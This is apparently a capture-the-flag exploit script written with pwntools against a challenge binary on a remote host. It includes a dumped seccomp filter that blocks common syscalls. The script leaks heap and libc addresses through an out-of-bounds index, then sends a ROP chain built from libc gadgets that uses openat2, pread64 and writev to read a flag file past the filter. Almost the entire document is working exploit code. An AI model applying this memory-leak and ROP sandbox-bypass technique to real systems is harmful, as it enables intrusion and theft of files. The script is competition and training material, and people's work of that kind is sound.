#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "pwn1.blitzhack.xyz"
PORT =  1337
PROCESS = "./chall"

"""
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x1b 0xc000003e  if (A != ARCH_X86_64) goto 0029
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A <  0x40000000) goto 0005
 0004: 0x15 0x00 0x18 0xffffffff  if (A != 0xffffffff) goto 0029
 0005: 0x15 0x17 0x00 0x00000000  if (A == read) goto 0029
 0006: 0x15 0x16 0x00 0x00000001  if (A == write) goto 0029
 0007: 0x15 0x15 0x00 0x00000002  if (A == open) goto 0029
 0008: 0x15 0x14 0x00 0x00000003  if (A == close) goto 0029
 0009: 0x15 0x13 0x00 0x00000009  if (A == mmap) goto 0029
 0010: 0x15 0x12 0x00 0x0000000a  if (A == mprotect) goto 0029
 0011: 0x15 0x11 0x00 0x0000000b  if (A == munmap) goto 0029
 0012: 0x15 0x10 0x00 0x00000012  if (A == pwrite64) goto 0029
 0013: 0x15 0x0f 0x00 0x00000013  if (A == readv) goto 0029
 0014: 0x15 0x0e 0x00 0x00000028  if (A == sendfile) goto 0029
 0015: 0x15 0x0d 0x00 0x00000038  if (A == clone) goto 0029
 0016: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0029
 0017: 0x15 0x0b 0x00 0x0000003a  if (A == vfork) goto 0029
 0018: 0x15 0x0a 0x00 0x0000003b  if (A == execve) goto 0029
 0019: 0x15 0x09 0x00 0x0000003e  if (A == kill) goto 0029
 0020: 0x15 0x08 0x00 0x00000101  if (A == openat) goto 0029
 0021: 0x15 0x07 0x00 0x00000127  if (A == preadv) goto 0029
 0022: 0x15 0x06 0x00 0x00000128  if (A == pwritev) goto 0029
 0023: 0x15 0x05 0x00 0x00000136  if (A == process_vm_readv) goto 0029
 0024: 0x15 0x04 0x00 0x00000137  if (A == process_vm_writev) goto 0029
 0025: 0x15 0x03 0x00 0x00000142  if (A == execveat) goto 0029
 0026: 0x15 0x02 0x00 0x00000147  if (A == preadv2) goto 0029
 0027: 0x15 0x01 0x00 0x00000148  if (A == pwritev2) goto 0029
 0028: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0029: 0x06 0x00 0x00 0x00000000  return KILL
 """

def add(name):
    r.sendline(b"1")
    r.recvline()
    r.sendline(name)
    r.recvuntil(b"> ")

def show():
    r.sendline(b"2")
    LEAK = r.recvuntil(b"1. Add Courses", drop=True)
    r.recvuntil(b"> ")
    return LEAK

def view(idx):
    r.sendline(b"4")
    r.sendlineafter(b": ", str(idx).encode())
    r.recvuntil(b"Data: ")
    LEAK = r.recvuntil(b"1. Add Courses", drop=True)
    r.recvuntil(b"> ")
    return LEAK

def free(idx):
    r.sendline(b"3")
    r.sendlineafter(b": ", str(idx).encode())
    r.recvuntil(b"> ")

def submit(data):
    r.sendline(b"5")
    r.recvline()
    r.sendline(data)

def exploit(r):
    payload1 = b"A"*0x20

    r.sendlineafter(b"name: ", payload1)
    r.sendlineafter(b"major: ", payload1)

    r.recvuntil(b"> ")

    add(b"PWNING1337")              # 0

    HEAPLEAK = u64(view(-1)[:-1].ljust(8, b"\x00"))
    HEAPBASE = HEAPLEAK - 0x11ee0

    log.info(f"LEAK: {hex(HEAPLEAK)}")
    log.info(f"HEAP BASE: {hex(HEAPBASE)}")

    payload = b"X"*(0x20-8-8)
    payload += p64(HEAPBASE + 0x127f0)  
    
    add(payload)                    # 1

    payload = p64(HEAPBASE + 0x127f0) * ((int)(0x610/8))

    add(payload)                    # 2
    free(2)

    LIBCLEAK = u64(view(3)[:-1].ljust(8, b"\x00"))
    libc.address = LIBCLEAK - 0x3ebca0

    log.info(f"LIBC LEAK: {hex(LIBCLEAK)}")
    log.info(f"LIBC BASE: {hex(libc.address)}")
    
    add(b"../flag")
    add(p64(HEAPBASE + 0x120f0) + p64(100))  # iovec_ptr
    
    POPRAX = libc.address + 0x1b500
    POPRDI = libc.address + 0x2164f
    POPRDXRSI = libc.address + 0x130539
    SYSCALL = libc.address + 0xd2625
    POPR10 = libc.address + 0x130515

    def syscall(num, rdi, rsi, rdx, r10):
        res = b""
        res += p64(POPRAX)
        res += p64(num)
        res += p64(POPRDI)
        res += p64(rdi)
        res += p64(POPRDXRSI)
        res += p64(rdx)
        res += p64(rsi)
        res += p64(POPR10)
        res += p64(r10)
        res += p64(SYSCALL)
        return res

    payload = b"A"*1031 + b"\x00"
    payload += b"B"*40
    payload += p64(0xfacebabe)

    # openat2(AT_FDCWD, HEAPBASE + 0x120f0, HEAPBASE + 0x500, 24, 0)
    payload += syscall(0x1b5, 0xffffff9c, HEAPBASE + 0x120f0, HEAPBASE + 0x500, 24)    

    # pread64(5, HEAPBASE + 0x120f0, 100, 0)
    payload += syscall(17, 5, HEAPBASE + 0x120f0, 100, 0)

    # writev(stdout, iovec_ptr, 1)
    payload += syscall(20, 1, HEAPBASE + 0x127f0, 1, 0)
    
    r.sendline(b"5")
    r.recvline()
    r.sendline(payload)

    r.interactive()

    return


if __name__ == "__main__":
    # e = ELF("./chall")
    libc = ELF("./libc-2.27.so")
    context.terminal = ["tmux", "splitw", "-v"]

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        #r = process("./chall")
        r = remote("localhost", 1337)
        # r = gdb.debug("./chall", """
        #    source ~/Tools/.gdbinit-gef
        #    continue
        # """)
        print(util.proc.pidof(r))
        pause()

    exploit(r)
